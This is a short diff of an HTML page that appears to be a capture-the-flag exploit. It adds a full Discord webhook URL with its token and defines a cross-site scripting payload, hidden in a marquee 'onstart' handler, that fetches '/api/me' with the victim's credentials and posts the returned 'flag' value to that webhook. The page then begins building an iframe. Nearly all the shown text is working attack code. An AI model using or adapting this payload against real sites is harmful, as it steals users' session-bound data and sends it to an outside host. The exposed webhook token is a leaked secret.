@@ -1,7 +1,7 @@
   <!DOCTYPE html>
   <body>
   <script>
-  const webhook = 'https://discord.com/api/webhooks/1463231849550581891/...';
+  const webhook = 'https://discord.com/api/webhooks/1463231849550581891/xi0StB5ZOeisP2iDil0iuOYJzYhT6SYt4L4WWrEzgLqmJjSl0N5xyhrgX0zrjAq7q9o0';
   const xss = `<details><summary>x</summary><marquee onstart="fetch('/api/me',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('${webhook}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:d.flag})}))">x</marquee></details>`;       
 
   const f = document.createElement('iframe');
